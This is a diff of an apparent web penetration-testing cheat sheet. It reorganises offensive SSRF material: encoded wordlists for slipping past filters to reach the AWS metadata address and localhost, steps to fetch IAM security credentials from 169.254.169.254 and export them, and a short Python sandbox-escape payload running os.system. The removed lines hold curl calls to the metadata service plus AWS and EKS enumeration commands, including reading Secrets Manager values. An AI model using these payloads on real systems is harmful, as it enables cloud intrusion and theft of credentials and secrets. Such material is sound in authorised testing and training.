@@ -1325,36 +1325,7 @@ e.g.
 e.g.  
 `http://[::]`
 
-#### AWS metadata bypass wordlist
-```
-169.254.169.254.nip.io
-http://169.254.169.254.nip.io
-%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2e%6e%69%70%2e%69%6f
-http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2e%6e%69%70%2e%69%6f
-169.254.169.254
-http://169.254.169.254
-%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34
-http://%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34
-0251.0376.0251.0376	
-http://0251.0376.0251.0376
-%30%32%35%31%2e%30%33%37%36%2e%30%32%35%31%2e%30%33%37%36
-http://%30%32%35%31%2e%30%33%37%36%2e%30%32%35%31%2e%30%33%37%36
-0xA9FEA9FE
-http://0xA9FEA9FE
-%30%78%41%39%46%45%41%39%46%45
-http://%30%78%41%39%46%45%41%39%46%45
-2852039166
-http://2852039166
-%32%38%35%32%30%33%39%31%36%36
-http://%32%38%35%32%30%33%39%31%36%36
-⑯⑨。②⑤④。⑯⑨｡②⑤④
-http://⑯⑨。②⑤④。⑯⑨｡②⑤④
-%6f%68%02%61%64%63%02%6f%68%61%61%64%63%2f
-http://%6f%68%02%61%64%63%02%6f%68%61%61%64%63%2f
-```
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/ssrf_meta_bypass.txt  
-
-#### Wordlist for localhost bypass
+### Wordlist for localhost bypass
 ```
 0o177.0.0.1
 %30%6f%31%37%37%2e%30%2e%30%2e%31
@@ -1438,7 +1409,54 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 ```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/ssrf_local_bypass.txt
 
-### Protocol Smuggling
+### SSRF for metadata theft from AWS
+http://169.254.169.254/latest/api/token 
+-> target
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<iam-role>
+```
+-> Export credentials
+```
+export AWS_ACCESS_KEY_ID=<access_key_id>   
+export AWS_SECRET_ACCESS_KEY=<secret_access_key>  
+export AWS_SESSION_TOKEN=<session_token>  
+```
+
+-> Performing enumeration and exploration in the cloud environment
+```
+In construction
+```
+
+### Wordlist ssrf_meta_bypass
+```
+169.254.169.254.nip.io
+http://169.254.169.254.nip.io
+%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2e%6e%69%70%2e%69%6f
+http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34%2e%6e%69%70%2e%69%6f
+169.254.169.254
+http://169.254.169.254
+%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34
+http://%68%74%74%70%3a%2f%2f%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34
+0251.0376.0251.0376	
+http://0251.0376.0251.0376
+%30%32%35%31%2e%30%33%37%36%2e%30%32%35%31%2e%30%33%37%36
+http://%30%32%35%31%2e%30%33%37%36%2e%30%32%35%31%2e%30%33%37%36
+0xA9FEA9FE
+http://0xA9FEA9FE
+%30%78%41%39%46%45%41%39%46%45
+http://%30%78%41%39%46%45%41%39%46%45
+2852039166
+http://2852039166
+%32%38%35%32%30%33%39%31%36%36
+http://%32%38%35%32%30%33%39%31%36%36
+⑯⑨。②⑤④。⑯⑨｡②⑤④
+http://⑯⑨。②⑤④。⑯⑨｡②⑤④
+%6f%68%02%61%64%63%02%6f%68%61%61%64%63%2f
+http://%6f%68%02%61%64%63%02%6f%68%61%61%64%63%2f
+```
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/ssrf_meta_bypass.txt  
+
+### SSRF - Protocol Smuggling
 
 -> HTTP-Based(Elastic, CouchDB, Mongodb, docker),etc.  
 -> Text-Based(ftp(21), smtp(587), zabbix(10051), mysql(3306), redis(6379), memcached(11211), etc.  
@@ -2079,58 +2097,6 @@ https://github.com/rodolfomarianocy/hackshell
 ```
 "__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";
 ```
-
-## Cloud (+)
-### Tricks in AWS 
--> Serverless Injection  
-`echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read`
-
--> Meta-data  
-```
-curl http://169.254.169.254/latest/api/token 
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
-```   
-
--> Models s3  
-`http://<BUCKETNAME>.s3.amazonaws.com/`  
-or  
-`http://s3.amazonaws.com/<BUCKETNAME>/`  
--> Recon  
-```
-export AWS_ACCESS_KEY_ID=<access_key_id>   
-export AWS_SECRET_ACCESS_KEY=<secret_access_key>  
-export AWS_SESSION_TOKEN=<session_token>  
-
-aws sts get-caller-identity  
-aws iam get-user  
-aws sts get-session-token
-aws s3 ls s3://<bucket> --no-sign-request  
-aws ec2 describe-instances
-```
-```
-aws configure --profile myprofile  
-aws sts get-access-key-info --access-key-id AKIA...    
-aws sts get-caller-identity --profile myprofile  
-aws ec2 describe-instances  --profile myprofile
-
-```
-```
-aws secretsmanager list-secrets --profile myprofile --region=us-east-1  
-aws secretsmanager get-secret-value --secret-id <secret> --profile myprofile --region=us-east-1
-```
--> EKS  
-```
-aws eks list-clusters --region us-east-1  
-aws eks describe-cluster --name <name_cluster> --region us-east-1  
-aws eks update-kubeconfig --region us-east-1 --name <name_cluster>  
-./kubectl get pods  
-./kubectl describe pods <name_pods>  
-./kubectl get pods --all-namespace
-```
-
-### Tools
-https://github.com/clarketm/s3recon  
-https://github.com/RhinoSecurityLabs/pacu
   
 ## Recon (+)
 ### Recon in ASN  
